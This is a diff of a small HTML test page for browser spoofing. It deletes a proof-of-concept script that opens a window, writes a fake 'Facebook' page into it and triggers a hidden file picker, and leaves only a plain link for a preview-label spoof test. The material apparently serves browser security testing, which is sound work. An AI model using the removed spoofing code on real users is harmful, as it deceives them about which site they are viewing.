@@ -1,29 +1,13 @@
-<!doctype html>
+  <!doctype html>
   <meta charset="utf-8">
-  <title>File Picker Popup Spoof PoC</title>
+  <title>Preview label spoof test</title>
 
-  <input id="picker" type="file" hidden>
-
-  <a href="https://www.facebook.com:1234" target="ux" onclick="return startPoc(event)">
+  <a
+    href="https://www.facebook.com:1234"
+    target="ux"
+    title="Facebook"
+    aria-label="Facebook"
+  >
     <h1>click here</h1>
   </a>
-
-  <script>
-  function startPoc() {
-    spoof();
-    document.getElementById('picker').click();
-    return true;
-  }
-
-  function spoof() {
-    var t = window.open('javascript:alert(document.domain)', 'ux');
-    try {
-      t.document.open();
-      t.document.write('<!doctype html><title>Facebook</title><h1>Spoofing</h1>');
-      t.document.close();
-    } catch (e) {
-      console.log('spoof write blocked:', e);
-    }
-  }
-  </script>
 
